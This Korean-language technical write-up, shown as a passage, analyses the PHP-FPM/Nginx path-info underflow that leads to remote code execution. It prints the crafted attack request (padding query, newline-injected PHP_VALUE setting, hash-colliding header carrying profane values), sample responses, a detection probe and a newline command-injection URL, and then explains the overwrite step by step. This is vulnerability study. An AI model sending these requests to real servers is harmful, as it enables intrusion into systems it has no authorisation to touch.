QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0
D-Pisos: 8========================================================================================================================================================================================================================================================D(250자)
Ebut: mamku tvoyu
```  

세션 렌더링 중에 위의 공격대로 auto_start를 성공적으로 변경했다면, set-cookie 헤더를 확인할 수 있다.  
```http  
(스캔중)
HTTP/1.1 200 OK
Server: nginx/1.17.6
Date: Tue, 24 Dec 2019 03:52:01 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/7.2.10

(성공)
HTTP/1.1 200 OK
Server: nginx/1.17.6
Date: Tue, 24 Dec 2019 03:52:01 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/7.2.10
Set-Cookie: PHPSESSID=cb493c52683ceaf5f75cb3e9a63698d3; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
```  

### 3. 길이 제한

앞에서 언급했듯이, `fcgi_data_seg->pos`에 널바이트를 작성하기 위해 길이를 34로 고정했다. 하지만, .php로 끝나야 하는 경우에는 34바이트보다 짧아야한다. 이런 길이 제한 때문에, 대부분의 INI Stuff 코드는 너무 길고, 실행 가능한 코드를 만들어 내는것이 더욱 어려워 진다.


##  공격 코드를 발전시켜보자.(해당 내용은 이해가 부족하여 자세한 내용 작성이 어려움)

### 1. `PATH_INFO`와 `QUERY_STRING`의 위치

이건 간단하게 우회할 수 있다. 위에 설명했듯이 PHP-FPM이 새로운 버퍼를 할당할 만큼 큰 문자열이 `PATH_INFO`에 들어가도록 하면 된다. 

### 2. 취약점 탐지

`PATH_INFO`에 `%0A`를 넣고 `PATH_INFO`와 `QUERY_STRING`의 길이를 상황에 맞게 늘리면, PHP-FPM이 충돌하게 된다.(취약점이 존재한다면)

또는, PHPINFO 페이지가 존재한다면 `/info.php/%0a.php` 요청을 보내서 `$_SERVER['PATH_INFO']`가 손상되었는지 여부를 관찰하면 된다.

### 3. 길이제한 우회

`fsgi_data_seg->pos`를 가리키기위한 길이 제한을 우회하려면 new line 문자를 이용하여 임의의 명령을 실행하는 방법이 있다.   
```http
http://localhost/index.php?a=%0asleep+5%0a
```

## 다시 정리해보는 취약점에 대한 간단한 설명
  
```xml   
GET /index.php/PHP_VALUE%0Asession.auto_start=0;;;?QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0
D-Pisos: 8========================================================================================================================================================================================================================================================D(250자)
Ebut: mamku tvoyu
```  
1. `Nginx`에서 사용자의 `Request`를 파싱하는 `FastCGI Process Manager`에 정의되어있는 `fastcgi_split_path_info` 정규표현식의 취약점을 사용할 수 있도록, 공격 URI에 `개행`문자를 삽입한다. 해당 문자열은 `PATH_INFO(env_path_info)`에 삽입된다.
2. `fastcgi_split_path_info`정규 표현식 처리 실패로 `env_path_info`가 `NULL`이 된다
3. `[1141번째 줄]path_info = env_path_info ? env_path_info + pilen - slen : NULL`구문을 통해 `path_info`변수가 특정 `Underflow`값으로 초기된다.
4. `path_info`가 특정 주소를 가리킬 수 있게 되었고, `[1222번째 줄]path_info[0] = 0`구문을 통해 특정주소의 첫번재 바이트를 `0x00`으로 설정이 가능해진다.
5. `Nginx`와 `FastCGI`가 통신할때 사용하는 전역변수가 들어있는 CGI 환경구조체-`fcgi_data_seg`의 현재위치 `pos` 주소를 `path_info`가 가리키도록 설정한다.(추후 공격시, `path_info`값을 `pos`주소까지 성공적으로 맞춘다면, set-cookie 헤더를 확인할 수 있다.)
6. `FCGI_PUTENV(char *name, char *value)`는 `fcgi_data_seg`구조체에서 `hash_value`를 검색하고, 메모리 힙에 로드된 해쉬버킷`(fcgi_hash_bucket)`값을 `char *value`와 `fcgi_hash_set`함수로 수정하는 함수이다.
7. `fcgi_hash_buckt`의 `hash_value`에 대한 제 2 역상 공격을 통해 `PHP_VALUE`와 동일한 해시값을 가진 더미헤더 `HTTP_EBUT`을 찾아낸다.
8. 공격 Request에서 `D-Fisos`헤더는 `Ebut`헤더가 특정위치에 들어갈 수 있도록 자리를 차지하는 역할이며, `Ebut`은 `fastcgi_params`에 정의된 값에 의해 전역변수 `HTTP_EBUT`으로 자동으로 바뀐다
9. 6번 과정을 자세히 설명하자면, `FCGI_PUTENV`의 `fcgi_hash_set`함수는 특정 헤시테이블의 `has_value`와 변수이름의 `길이`가 동일할 때, 새로운 변수와 값으로 덮어쓸 수 있다.
10. 메모리 힙에서 `HTTP_EBUT`이 올라갈 주소를 `D-Fisos`헤더를 통해 수정된 `fcgi_data_seg->pos`주소와 `같은 버퍼(fcgi_data_seg)`안에 위치하도록 `유도`하고, 수정된 `fcgi_data_seg->pos` 값과 `[1226번째 줄]FCGI_PUTENV(request, "ORIG_SCRIPT_NAME", orig_script_name)` 구문을 통해 `"PHP_VALUE\nsessi.."`를 포함한 나머지 CGI 환경구조체가 작성된다면, `HTTP_EBUT`과 해당`값`은 `PHP_VALUE`와 `%0A로 구분되어지는 값`으로 덮어씌어 진다(`PUT`).
11. 물론, PHP FastCGI Process Manager는 `HTTP_EBUT`과 `PHP_VALUE`의 `hash_value, var_len`이 동일하여 같은 헤더로 인식했기 때문에 가능하다.
12. `[1326번째 줄]ini = FCGI_GETENV(request, "PHP_VALUE")` 구문을 통해 헤쉬버킷`(fcgi_hash_bucket)`에서 `변조된 PHP_VALUE(전 HTTP_EBUT)`를 검색하여 `ini stuff`변수로 가져오며, 이를 `PHP ini`파일에 작성한다.
13. `PHP ini`에 작성하려는 값을 공격 체인을 통해 구성한다면, 원격 명령 제어를 위한 설정을 만들 수 있다. 또한 이를 통해, 다양한 원격 명령 실행이 가능하다.


* 공격 페이로드는 [여기로](https://chanbin.github.io/threat/2019/12/26/php-fpm-payload)가면 볼 수 있다.
